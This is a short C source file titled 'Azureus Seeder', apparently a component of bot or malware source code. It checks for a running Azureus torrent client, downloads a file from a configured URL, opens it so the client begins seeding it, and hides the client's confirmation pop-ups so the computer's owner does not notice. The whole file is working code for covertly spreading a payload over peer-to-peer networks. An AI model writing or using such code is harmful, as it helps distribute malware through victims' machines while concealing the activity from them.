/*
Azureus Seeder
Coded by a59
*/
#include <windows.h>
#include <stdio.h>
#include <urlmon.h>
#include "includes.h"
#include "extern.h"
#pragma comment( lib, "Urlmon.lib" )

#include "seeder2.h"



int SeedAzureus( char* szLink, char* szSaveAs )
{
	int i;
	HWND hAzureus = FindWindow( 0, "Azureus" );
	HWND hPopup, hExists;
	
	if( hAzureus == NULL )
		return 1;
	
	if( URLDownloadToFile( 0, szLink, szSaveAs, 0, 0 ) != S_OK )
		return 2;
	
	if( (int)ShellExecute( 0, "open", szSaveAs, 0, 0, SW_NORMAL ) <= 32 )
		return 3;
	
	for( i = 0; i < 10; i++ )
	{
		hExists = FindWindow( 0, "Already exists" );
		
		if( hExists != NULL )
		{
			ShowWindow( hExists, SW_HIDE );
			return 4;
		}
		
		Sleep( 100 );
	}
	
	for( i = 0; i < 10; i++ )
	{
		hPopup = FindWindow( 0, "Information" );
		
		if( hPopup != NULL )
			break;
		
		Sleep( 100 );
	}
	
	if( hPopup == NULL )
		return 5;
	
	ShowWindow( hPopup, SW_HIDE );
	
	return 0;
};

int azureus( )
{
		
	SeedAzureus( szUrl2, szRar2 );

	
	return 0;
}; 
